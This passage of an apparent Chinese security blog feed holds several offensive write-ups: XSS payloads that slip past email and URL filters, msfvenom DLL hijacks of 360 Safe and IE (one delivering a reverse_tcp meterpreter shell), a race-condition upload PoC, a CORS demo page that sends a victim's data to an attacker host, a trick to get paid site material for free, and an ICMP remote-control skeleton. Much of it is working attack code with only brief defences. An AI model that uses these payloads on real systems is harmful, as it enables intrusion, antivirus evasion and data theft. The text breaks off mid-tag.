通过名称获取特定的外部变量，并且可以通过过滤器处理它</p></blockquote><p>使用过滤器里的email来过滤，由于此函数里面的email过滤是通过RFC822协议来验证是否为邮箱的<br>只要你payload满足这个协议即可成功触发xss<br>RFC822:<a href="http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate" target="_blank" rel="noopener">http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate</a></p><p><img src="https://s2.ax1x.com/2019/04/13/ALxLfs.png" alt=""></p><p>尝试将payload插入</p><pre><code>&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@x.y</code></pre><p>由于filter_input()函数会过滤掉空格，所以payload的时候要避免空格<br><img src="https://s2.ax1x.com/2019/04/13/ALzZX6.md.png" alt=""></p><p>通过这个题可以得到一个检测方法：</p><pre><code>如果是用filter_input()函数来判断是否为email的话，输入 &quot;&lt;&quot;@x.y filter_input()函数会认为这是个邮箱使用preg_match()进行正则匹配的话,输入&quot;&lt;&quot;@x.y 认为不是个邮箱一般实际中遇见邮箱填写的地方可以试试</code></pre><p><b>第二题</b><br>这题会根据你输入的url来生成url (a标签)，猜测使用filter_input()或正则来匹配 (因为匹配url的正则能被绕过)<br>正则是</p><pre><code>[a-zA-z]+://[^\s]*</code></pre><p>测试javascript://alert(1) 可以看到正则成功匹配出了<br><img src="https://s2.ax1x.com/2019/04/13/AOSe8s.png" alt=""></p><p>插入payload尝试，发现不行<br><img src="https://s2.ax1x.com/2019/04/13/AOSYG9.png" alt=""></p><p>根据文章说到<br><img src="https://s2.ax1x.com/2019/04/13/AOSNx1.md.png" alt=""></p><p>不明白为什么要将%0AURL编码两次？</p><pre><code class="javascript">通过查询可以知道js里面的%0A是换行符，将%0A URL编码两次，浏览器默认解码一次，那么%0A就会存在最后payload会变成这样javascript://alert(1)</code></pre><p><img src="https://s2.ax1x.com/2019/04/13/AOpZdO.md.png" alt=""></p><p><b>第三题</b><br>这题根据测试，发现判断条件有些改变</p><p>使用上一题的payload发现并不行= =，后面继续阅读文章和自己实现<br>发现判断的url是这样的</p><pre><code>https://google.com/search?q=Brute%252BXSS 正则认为这才是url = =</code></pre><p>那么根据分析得到的payload是</p><pre><code class="javascript">javascript://https://google.com/search?q=Brute%252BXSS%250Aalert(1)</code></pre><p><img src="https://s2.ax1x.com/2019/04/13/AO9itg.md.png" alt=""></p><p><b>第四题</b><br>通过测试发现正则是判断长度的，长度如果不达到32将不显出<br><img src="https://s2.ax1x.com/2019/04/13/AO9GcR.png" alt=""></p><p>最后得出payload是</p><pre><code class="javascript">12345678901&lt;svg onload=alert(1)&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/04/14/AO95CQ.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dll劫持破坏360</title>
      <link href="/posts/c938687f.html"/>
      <url>/posts/c938687f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上研究某宏执行命令，然后想到能不能把这个该死的360给搞了。后面吃完饭发现，没法子想了一下看看能不能硬核绕60。没想到居然成了<br><img src="http://i0.hdslb.com/bfs/archive/2e31734e17694760fd94e1b1f1baeb1cafd2ea71.jpg" alt="2e31734e17694760fd94e1b1f1baeb1cafd2ea71.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>实验环境：windows7<br>360版本：360安全卫士11</p><p>首先生成一个dll</p><pre><code>msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; lbw.dll</code></pre><p>我们使用Procmon来观察360缺少的dll</p><p>Procmon配置规则如下<br><img src="https://s2.ax1x.com/2019/04/07/AhpWjA.png" alt="AhpWjA.png"></p><p>启动360safe.exe<br><img src="https://s2.ax1x.com/2019/04/07/Ah9SEV.md.png" alt="Ah9SEV.md.png"></p><p>其实大部分软件都有这个，后面我去问Yansu老哥，回答是</p><pre><code>360是用vc写的，然后360没有自带这个dll</code></pre><p>也就是说缺少这个dll都可以利用这个操作来搞事情。好像有道理<br>之前百度云也缺少这个，试了一下也可以，没想到360也缺少这个鬼东西<br>修改msf生成的dll名为api-ms-win-core-synch-l1-2-0，扔进C:\Windows文件夹里<br>重新执行360<br><img src="https://s2.ax1x.com/2019/04/07/Ah9nUK.gif" alt="Ah9nUK.gif"></p><p>发现360执行之后会弹出calc，然后启动不成功了？？？fuck<br>尝试执行命令然后添加一个用户<br><img src="https://s2.ax1x.com/2019/04/07/AhC3JU.gif" alt="AhC3JU.gif"></p><p>你们在360运行的时候添加这个dll会怎么样呢？？<br><img src="https://s2.ax1x.com/2019/04/07/AhCYQJ.gif" alt="AhCYQJ.gif"></p><p>经过测试360有50%几率会正常运行，有50%的几率会崩溃。但是加速球不会挂掉<br>你点一下360就会触发dll了（崩溃也会触发dll）</p><p>当遇见类似于以下情况的时候可以试试：<br>拿到了管理员权限或system权限但是有360等等xxx<br><a href="http://www.91ri.org/13805.html" target="_blank" rel="noopener">思路分享：安全狗+360全套添加账户时一些小技巧_91Ri.org</a></p><p><b>我在想可不可以组合攻击？？</b></p><p>由于时间关系我先去上学，告辞</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>将UAC提升到最高</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逻辑绕过某站下载网页素材</title>
      <link href="/posts/8eec787.html"/>
      <url>/posts/8eec787.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近开了个坑，想用django写个项目..然后发现那个前端，那个前端啊。真是恶意极强，真的是佛了后面找到某素材站。还要钱下载，我。。。祝你清明节快乐<br><img src="https://img3.hackhome.com/img2018/4/24/16/543838169.jpg" alt="543838169.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>素材站：<a href="http://www.17sucai.com" target="_blank" rel="noopener">jQuery网页特效最全网页模板和网站模板jQuery代码_17素材网</a><br>一开始想去挖他看看有没有逻辑充值，然后发现后端做了效验<br><img src="https://s2.ax1x.com/2019/04/06/AWHAMD.png" alt="AWHAMD.png"></p><p><img src="https://s2.ax1x.com/2019/04/06/AWHHwd.md.png" alt="AWHHwd.md.png"></p><p>提交表单之后发现还是50块。。。emmm，然后就想着下载能不能搞搞<br>发现也是后端判断的。。我草</p><p>回归到素材那页，发现除了下载还有个演示功能（！= =）<br><img src="https://s2.ax1x.com/2019/04/06/AWO1ts.png" alt="AWO1ts.png"></p><p>打开一看，源码一查iframe嵌套进去的。。。直接打开这个html下载完事…<br><img src="https://s2.ax1x.com/2019/04/06/AWO2nO.md.png" alt="AWO2nO.md.png"></p><p>访问，然后下载保存就完事了..<br><img src="https://s2.ax1x.com/2019/04/06/AWO4Nd.md.png" alt="AWO4Nd.md.png"></p><p>随便说一下:我现在一般把笔记全部放在<a href="https://github.com/422926799/note" target="_blank" rel="noopener">https://github.com/422926799/note</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Talking about SRC information collection</title>
      <link href="/posts/dfd6492e.html"/>
      <url>/posts/dfd6492e.html</url>
      <content type="html"><![CDATA[<p><b>0x00前言</b><br>src想挖的好，信息收集不可少。信息收集弄的好的，src都榜上有名了…<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20190301/308a70a437844de69d26bf05b6aae583.jpeg" alt=""><br>（图与本文无关）</p><p><b>0x001正文</b><br>1.先从补天哪里看到你要挖的厂商信息，可以得到这么几个信息</p><pre><code>1.厂商名称2.厂商的漏洞收集范围3.厂商提供的一些东东</code></pre><p>2.whois查询这个厂商</p><pre><code>国内的whois查询:http://whois.chinaz.com国外的whois查询:https://who.is可以得到的信息：  邮箱  电话  联系人  域名注册商接着whois反查这个站点的主持人邮箱和公司名称可以得到的信息：  部分子域名</code></pre><p>3.天眼查这个厂商</p><pre><code>可以获取到兄弟域名的信息</code></pre><p>4.子域名挖掘</p><pre><code>先进行在线查询推荐在线查询的站点:https://phpinfo.me/domain/然后在用国外的dns接口进行查询:https://dns.bufferover.run/dns?q=你的域名百度域名查询的接口:http://ce.baidu.com/index/getRelatedSites?site_address=你的域名使用subDomainsBrute工具进行查询仓库地址:https://github.com/lijiejie/subDomainsBrute可以得到的信息：  一大批子域名</code></pre><p>5.判断是否有CDN</p><pre><code>如果没有CDN就可以对厂商给的域名进行C段扫描和旁站查询因为一些大厂直接买了一个C段的推荐工具:whatweb可以得到的信息：  C段的站点  同IP站点有CDN则进行真实IP获取，有那么几个操作  1.查询DNS解析记录  2.站长超级ping（关注IP出现次数最多的IP绑定hosts文件访问）  3.钟馗之眼等引擎进行搜索，查询真实IP  4.DNS渊源  5.DDOS打回原形</code></pre><p>6.是否有WAF</p><pre><code>一些直自己有SRC平台的厂商或安全做的很好厂商都有安装WAF对部分站点进行WAF判断，如果部分有的话那么绝大多数都有安WAF。当然也有单个安WAF的可获得的信息：  站点是否安装了WAF</code></pre><p>7.端口扫描和系统判断</p><pre><code>对弄出来的子域名进行整理，获取IP然后用nmap扫描80,443,8080或指定端口可获得的信息：  开放的端口  系统类型</code></pre><p>8.判断存活的站点和获取HTTP响应头的Server头</p><pre><code>有些子域名是死掉的或者过期域名等其他类因数，要对其进行排除可获得的信息：  还存活的域名  web的容器服务</code></pre><p>9.反查IDC</p><pre><code>使用IP反查IDC推荐站点:https://myip.ms相同站点查询可获得信息  服务器的IDC  同类的站点</code></pre><p>10.信息整理</p><pre><code>获得了这么多信息当然要对他们进行整理，创建两个xls文件一个放查询到的信息，另一个放查询到的子域名</code></pre><p>要说的就那么多，欢迎各位大佬补充~</p><p>看过的文章：<br><a href="https://www.chainnews.com/articles/307380516533.htm" target="_blank" rel="noopener">那些年挖过的 SRC 之我是捡漏王 - 链闻 ChainNews</a></p><p><b>0x03与本文无关的中二语句</b><br>这是一个中二的语句与本文无关</p><pre><code>接受你的赠礼，必以死亡作为回赠                                            ---《鬼泣5-维吉尔》</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Conditional Competitive Learning</title>
      <link href="/posts/2d4f21a3.html"/>
      <url>/posts/2d4f21a3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>准备上学，抽时间学了条件竞争并做了笔记<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181109/eefcba0df71b4ca18385a0152f51106a.jpeg" alt="eefcba0df71b4ca18385a0152f51106a.jpeg"></p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><b>0x00介绍</b><br>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含webshell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作)，攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击</p><p><b>0x01漏洞一般出现的位置</b><br>SRC好像都没见过，一般出现在CTF题吧<br>就是允许任意文件上传，但是会判断是否为webshell。更简洁的来说就是：</p><pre><code>先将文件上传到指定目录然后在判断是否为webshell，是的话在删除。攻击者可以利用这段时间差来进行生成另一个shell。一般存在条件竞争的上传文件后，在短暂时间内发现可以访问。可是后面就被删了，这就有：条件竞争</code></pre><p><b>0x02实验</b><br>存在漏洞的代码</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;条件竞争&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;demo.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; na=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;);if(isset($_FILES[&#39;file&#39;])) {    if ($_FILES[&#39;file&#39;][&#39;error&#39;] &gt; 0) {        echo &quot;文件上传错误&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;    } else {        echo &quot;上传的文件名:&quot; . $_FILES[&#39;file&#39;][&#39;name&#39;] . &quot;&lt;br&gt;&quot;;        echo &quot;文件类型:&quot; . $_FILES[&#39;file&#39;][&#39;type&#39;] . &quot;&lt;br&gt;&quot;;        echo &quot;文件大小:&quot; . $_FILES[&#39;file&#39;][&#39;size&#39;] . &quot;&lt;br&gt;&quot;;        echo &quot;文件临时存储位置&quot;.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;].&quot;&lt;br&gt;&quot;;        move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;upload/&#39; . $_FILES[&#39;file&#39;][&#39;name&#39;]);        $demo=explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]);        $hz=end($demo);        sleep(10);        if ($hz!=&#39;jpg&#39;){            unlink(&#39;upload/&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]);            echo &quot;发现webshell，已删除&quot;;        }    }}?&gt;</code></pre><p>poc</p><pre><code class="python">import requestsimport threadings = 0def demo(url):    global s    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;}    rqt=requests.get(url=url,headers=headers)    s+=1    print(&#39;[+] 已请求:{}次&#39;.format(s))    rqt=requests.get(url=&#39;http://127.0.0.1/jinz/upload/xxx.php&#39;,headers=headers)    if rqt.status_code==200:        print(&#39;[+] shell上传成功&#39;)if __name__ == &#39;__main__&#39;:    urls=&#39;http://127.0.0.1/jinz/upload/xx.php&#39;    for i in range(1,30):        t=threading.Thread(target=demo,args=(urls,))        t.start()</code></pre><p>  <img src="https://s2.ax1x.com/2019/03/24/AYQxqH.md.png" alt=""></p><p>  <img src="https://s2.ax1x.com/2019/03/24/AYlSZd.md.png" alt="AYlSZd.md.png"></p><p>  <img src="https://s2.ax1x.com/2019/03/24/AYlpdA.md.png" alt="AYlpdA.md.png"></p><p>  <b>0x003修复</b><br>  针对此漏洞修复是，要判断是否为允许后缀在上传的过程判断，不要上传完毕才判断<br>  对上传后的文件进行重命名</p><p>  转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cross-domain Vulnerability Learning</title>
      <link href="/posts/f7db9d16.html"/>
      <url>/posts/f7db9d16.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久没更博客了。。最近手扭到了，原因是某领导来我们学校检查。到男生宿舍后面发现一堆烟头，说到这里我tm服了。。砸这么牛皮= =。吸完就往下扔，后来晚上总宿管全员检查。我们宿舍去开会的偷偷发了个短信给我们，下床双手撑着飞上墙壁看看有没有打火机。。。然后下来时手就肿了。。</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181109/eefcba0df71b4ca18385a0152f51106a.jpeg" alt=""></p><h4 id="CORS跨域读取学习"><a href="#CORS跨域读取学习" class="headerlink" title="CORS跨域读取学习"></a>CORS跨域读取学习</h4><p><b>0x00同源策略</b><br>SOP同源策略，该策略是浏览器的一个安全基操，如果没有同源策略，那么你打开了一个合法网站，又打开了一恶意网站。恶意网站的脚本能够随意的操作合法网站可操作资源，没有任何限制。</p><p>同源策略介绍:<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">Same-origin policy - Wikipedia</a><br>浏览器同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读取读写对方的资源。那么何为同源：<br>|协议|域名|端口|是否同源<br>|-|-|-|-|<br>|相同|相同|相同|是<br>|不同|相同|相同|否<br>|相同|相同|不相同|否</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1539004/q2owt35awt.jpeg?imageView2/2/w/1620" alt=""></p><p>一个最好的例子：</p><pre><code>你在本地手动远程读取百度的logo，以读取到的二进制数据为准。很快你就会发现不行这都是同源策略</code></pre><blockquote><p>CORS，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。</p></blockquote><p><b>0x01跨域访问的一些场景</b></p><blockquote><p>1.比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。<br>2.程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。<br>3.电商网站想通过用户浏览器加载第三方快递网站的物流信息。<br>4.子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</p></blockquote><p><b>0x03CORS漏洞的攻击流程</b><br>Access-Control-Allow-Origin:*<br>Access-Control-Allow-Credentials:true</p><pre><code>通过指定：Access-Control-Allow-Origin允许那些来源可以跨域读取本站的资源，当Access-Control-Allow-Origin为默认的时候。允许任意来源来访问本站的资源，那么就导致了跨域读取当站点没有指定Access-Control-Allow-Origin的时候，用户访问恶意站点的脚本，恶意站点的脚本请求站点。会被浏览器的同源策略默认拦截当站点设置了Access-Control-Allow-Origin:*，用户访问恶意站点的脚本，恶意站点的脚本请求站点。浏览器的同源策略不起作用。因为被请求的站点允许任何来源跨域读取本站内容</code></pre><p>攻击者手法：<br>攻击者利用cors漏洞把A.com的orgin改成接收用户信息的在线脚本B.com，然后生成一个链接引诱受害者去点击，如果受害者正好登录了A.com 并且点击了这个链接，则会把cookie发送到B.com</p><p>实例：<br>物理机win7:<a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a><br>Kali:<a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a></p><p><a href="http://www.a.com/cors/a.php" target="_blank" rel="noopener">www.a.com/cors/a.php</a></p><pre><code class="php">&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;);if (isset($_COOKIE[&#39;demo&#39;])){    echo &quot;欢迎管理员登录&quot;;}else{    echo &#39;你好,游客&#39;;}if(isset($_GET[&#39;user&#39;])){    if($_GET[&#39;user&#39;]==&#39;admin&#39;){        setcookie(&#39;demo&#39;,&#39;1&#39;);    }}?&gt;</code></pre><p><a href="http://www.b.com/demo.html" target="_blank" rel="noopener">www.b.com/demo.html</a></p><pre><code class="html">&lt;!DOCTYPE&gt;&lt;html&gt;&lt;h1&gt;Hello I evil page. &lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt;function loadXMLDoc(){    var xhr1;    var xhr2;    if(window.XMLHttpRequest)    {        xhr1 = new XMLHttpRequest();        xhr2 = new XMLHttpRequest();    }    else    {        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);    }    xhr1.onreadystatechange=function()    {        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response        {            var datas=xhr1.responseText;            xhr2.open(&quot;POST&quot;,&quot;http://www.b.com/save.php&quot;,&quot;true&quot;);            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);            xhr2.send(&quot;T1=&quot;+escape(datas));              }    }    xhr1.open(&quot;GET&quot;,&quot;http://www.a.com/cors/login.php&quot;,&quot;true&quot;) //request user page.    xhr1.withCredentials = true;        //request with cookie    xhr1.send();}loadXMLDoc();&lt;/script&gt;&lt;/html&gt;</code></pre><p>login.php没有设置Access-Control-Allow-Origin<br>测试如下：<br>自动帮我们设置了origin头<br><img src="https://s2.ax1x.com/2019/03/23/AJg1P0.md.png" alt="AJg1P0.md.png"></p><p>当我们放包，继续让浏览器执行的时候</p><p>(浏览器阻止了跨域读取)<br><img src="https://s2.ax1x.com/2019/03/23/AJgaZ9.md.png" alt="AJgaZ9.md.png"></p><p>在login.php设置Access-Control-Allow-Origin</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;);header(&quot;Access-Control-Allow-Origin: http://b.com&quot;);header(&quot;Access-Control-Allow-Credentials: true&quot;);if (isset($_COOKIE[&#39;demo&#39;])){    echo &quot;欢迎管理员登录&quot;;}else{    echo &#39;你好,游客&#39;;}if(isset($_GET[&#39;user&#39;])){    if($_GET[&#39;user&#39;]==&#39;admin&#39;){        setcookie(&#39;demo&#39;,&#39;1&#39;);    }}?&gt;</code></pre><p>重新请求一下,发现返回的响应里面有（Access-Control-Allow-Origin）<br>PS:在浏览器执行下一步执行用burp抓包重放是可以看到响应结果的<br><img src="https://s2.ax1x.com/2019/03/23/AJRw36.png" alt="AJRw36.png"></p><pre><code>Access-Control-Allow-Origin指是允许访问的源Access-Control-Allow-Credentials指的是允许带上cookie访问资源</code></pre><p>最后结果：<br><img src="https://s2.ax1x.com/2019/03/23/AJWSrF.png" alt="AJWSrF.png"></p><p><img src="https://s2.ax1x.com/2019/03/23/AJROCq.png" alt="AJROCq.png"></p><p>这里要注意的是，我们也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。<br><img src="https://s2.ax1x.com/2019/03/23/AJRsDe.png" alt="AJRsDe.png"></p><p>实际上挖掘跨域资源共享的要点就是：见到有origin请求返回的响应有Access-Control-Allow-Origin，尝试修改Origin头为自己的接收地址就行，详细看下面的secqun的文章。</p><p><b>0x04总结</b><br>实战挖SRC例子：<br><a href="https://secquan.org/Notes/1068983" target="_blank" rel="noopener">secqun-前端跨域资源共享</a><br>遨游浏览器没有做同源策略<br><a href="http://www.anquan.us/static/bugs/wooyun-2015-0155672.html" target="_blank" rel="noopener">Maxthon for mac 获取保存的密码/跨域信息读取/任意文件写入 | WooYun-2015-155672 | WooYun.org</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>country IP scan</title>
      <link href="/posts/d87b7fc4.html"/>
      <url>/posts/d87b7fc4.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>在学校搜索东西的时候，发现了一个可以获取全球国家指定IP范围的工具。感觉不错顺手就爬了然后发现可以利用这范围的IP干一些huai事（滑稽）<br><img src="https://i1.hoopchina.com.cn/blogfile/201609/12/BbsImg14736650442813_960x528.jpg?x-oss-process=image/resize,w_800/format,webp" alt="format,webp"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><hr><p>思路如下：</p><pre><code>1.先抓取指定全球国家代号（图1）2.随便点个国家可以看到全部IP范围，很直男（图2）3.获取IP开始范围和结束范围，使用正则匹配IP的4个位置，然后生成IP范围列表（图3）4.然后就是指定端口扫描5.上网找个站爬了用来IP反查域名6.调用shodan API来搜索IP</code></pre><p>图1<br><img src="https://s2.ax1x.com/2019/03/15/AVGXb4.png" alt="AVGXb4.png"></p><p>图2<br><img src="https://s2.ax1x.com/2019/03/15/AVJkrD.png" alt="AVJkrD.png"></p><p>图3<br><img src="https://s2.ax1x.com/2019/03/15/AVJaR0.md.png" alt="AVJaR0.md.png"></p><p>生成IP范围的代码：</p><pre><code class="python">import restart=&#39;1.1.1.1&#39;stop=&#39;255.255.255.255&#39;zz=re.findall(&#39;[0-255]{1,}&#39;,start)zz_s=re.findall(&#39;[0-255]{1,}&#39;,stop)for q in range(int(zz[0]),int(zz_s[0]),1):    for b in range(int(zz[1]),int(zz_s[1]),1):        for c in range(int(zz[2]),int(zz_s[2]),1):            for r in range(int(zz[3]),int(zz_s[3]),1):                ip=&#39;{}.{}.{}.{}&#39;.format(q,b,c,r,)                print(ip)</code></pre><p><img src="https://s2.ax1x.com/2019/03/15/AVJ5LD.png" alt=""></p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/03/14/AALA4e.md.gif" alt=""></p><p>如果gif动不了的话就看：<a href="https://imgchr.com/i/AALA4e" target="_blank" rel="noopener">ipscan - 路过图床</a></p><p>仓库地址：<a href="https://github.com/422926799/Ipscan" target="_blank" rel="noopener">GitHub - 422926799/Ipscan</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IEdll hijacking</title>
      <link href="/posts/c1ab089d.html"/>
      <url>/posts/c1ab089d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午原本是想复现这篇文章里面的<a href="https://egre55.github.io/system-properties-uac-bypass/" target="_blank" rel="noopener">UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking – egre55 – thoughts on security</a> DLL劫持。没想到我在WIndows Server 2008 R2测试的时候发现IE的DLL劫持<br><img src="http://img2.ali213.net/picfile/News/2015/07/19/2015071941728151.jpg" alt="2015071941728151.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>环境：windows Server 2008 R2<br>IE版本：IE 7</p><p><img src="https://s2.ax1x.com/2019/03/04/kOTCcV.png" alt="kOTCcV.png"></p><p>IE文件夹里面原来的样子：<br><img src="https://s2.ax1x.com/2019/03/04/kOTn91.png" alt="kOTn91.png"></p><p>先配置好Procmon<br><img src="https://s2.ax1x.com/2019/03/04/kOTagP.png" alt="kOTagP.png"></p><p>重启Procmon然后打开IE，找到credssp.dll<br><img src="https://s2.ax1x.com/2019/03/04/kOTLgx.md.png" alt="kOTLgx.md.png"></p><p>当时我是抱着一试的心态，用msfvenom生成了个dll</p><pre><code>msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; credssp.dll</code></pre><p>然后放入到IE的文件夹里，然后重启IE<br><img src="https://s2.ax1x.com/2019/03/04/kO7F2t.md.png" alt="kO7F2t.md.png"></p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/03/04/kO7Na4.gif" alt="kO7Na4.gif"></p><p>再次用Procmon分析<br>发现注册表会找这个DLL，如果找到了就执行<br><img src="https://s2.ax1x.com/2019/03/04/kO74zt.md.png" alt="kO74zt.md.png"></p><p>credssp.dll成功被IE执行<br><img src="https://s2.ax1x.com/2019/03/04/kO7Oij.md.png" alt="kO7Oij.md.png"></p><p>msfvenom生成反弹meterpreter的dll</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f dll &gt; credssp.dll</code></pre><p>替换掉那个弹CALC的dll</p><p><img src="https://s2.ax1x.com/2019/03/04/kOHQTe.png" alt="kOHQTe.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOHt6P.gif" alt="kOHt6P.gif"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Implementation of ICMP C2</title>
      <link href="/posts/eac90672.html"/>
      <url>/posts/eac90672.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>之前在学校写了一个ICMP的远控，现在来说一下当初写的思路<br><img src="http://p3.pstatp.com/large/pgc-image/15229176406623ca48a181b" alt="15229176406623ca48a181b"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p>windows安装scapy:<a href="https://www.cnblogs.com/qingkongwuyun/p/8508733.html" target="_blank" rel="noopener">Windows上安装scapy - 晴空无云 - 博客园</a></p><p>1.首先你得确定你这个远控有啥功能，你要怎么去实现。通过什么协议来实现，数据包的交互过程是？<br>2.数据在传送过程中会遇到什么问题？数据包过大会不会发送不了，或者只发送一半？<br>3.是否要对传输的过程进行加密</p><p>我这里使用的协议是ICMP，使用scapy来实现ICMP头，然后使用Padding来带入我要发送的值<br>例如：</p><p>server</p><pre><code>from scapy.all import *class demo:    def __init__(self,eth,dst,src):        self.eth=eth        self.dst=dst        self.src=src    def server(self,data):        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&#39;{}&#39;.format(data))        send(a,count=1)if __name__ == &#39;__main__&#39;:    d=demo(eth=&#39;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&#39;,src=&#39;127.0.0.1&#39;,dst=&#39;192.168.3.75&#39;)    d.server(data=&#39;demo&#39;)</code></pre><p>client</p><pre><code>from scapy.all import *class demo:    def __init__(self,eth,dst,src):        self.eth=eth        self.dst=dst        self.src=src    def client(self):        jieshou = sniff(iface=self.eth, filter=&#39;icmp&#39;, count=1, timeout=99999)        paddings = jieshou[0][&#39;Padding&#39;]        print(paddings)        jg = str(paddings).lstrip(&quot;b&#39;&quot;[0]).replace(&quot;&#39;&quot;, &#39;&#39;)        if jg != &#39;&#39;:            print(jg)if __name__ == &#39;__main__&#39;:    d=demo(eth=&#39;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&#39;,src=&#39;127.0.0.1&#39;,dst=&#39;192.168.3.75&#39;)    d.client()</code></pre><p><img src="https://s2.ax1x.com/2019/03/03/kqhlCT.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/03/03/kqh8v4.png" alt=""></p><p><img 